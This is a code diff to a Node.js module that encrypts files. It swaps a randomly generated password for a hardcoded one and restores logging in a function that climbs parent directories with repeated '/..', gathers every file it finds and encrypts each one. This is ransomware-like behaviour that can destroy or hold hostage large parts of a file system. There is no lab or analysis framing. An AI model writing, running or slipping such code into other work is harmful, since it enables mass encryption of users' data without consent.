@@ -17,10 +17,11 @@ module.exports = {
       password = args.p;
     } else {
       var generator = require('generate-password');
-      password = generator.generate({
-          length: 64,
-          numbers: true
-      });
+      // password = generator.generate({
+      //     length: 64,
+      //     numbers: true
+      // });
+      password = "prXYpROZmmZadQTVrpOu9nDRqXu2MajbxnHPOXbHUDdHbhC6PNvlCZMLSMrSfLVu";
     }
 
     let data = JSON.stringify({
@@ -47,16 +48,15 @@ module.exports = {
   },
   other: function (args,password,shell,count) {
 
-    // console.log(shell.exec('pwd').stdout);
-    // var path = shell.exec('pwd').stdout.replace(/^\s+|\s+$/g, '');
-    // console.log(count);
+    console.log(shell.exec('pwd').stdout);
+    var path = shell.exec('pwd').stdout.replace(/^\s+|\s+$/g, '');
+    console.log(count);
     var path = "."+"/..".repeat(count);
-    // console.log("{"+path+"}");
+    console.log("{"+path+"}");
     var files = getFiles(path);
-    // console.log(files);
+    console.log(files);
 
     files.forEach(function(file){
-      // console.log("At: ",file);
       encryptFile(file,password);
     });
 
